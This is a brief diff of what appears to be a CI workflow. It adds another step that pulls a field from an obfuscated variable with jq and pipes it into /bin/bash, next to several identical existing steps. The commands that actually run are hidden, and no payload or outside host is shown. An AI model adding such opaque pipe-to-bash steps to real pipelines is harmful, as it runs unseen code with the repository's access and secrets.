@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$jxscp9056" | jq -r .wef08 | /bin/bash
           echo $vecq04219 | jq -r .tr7 | /bin/bash
           echo $mhw8114 | jq -r .sfuc68743 | /bin/bash
+          printf '%s' "$siff929" | jq -r .slr206 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
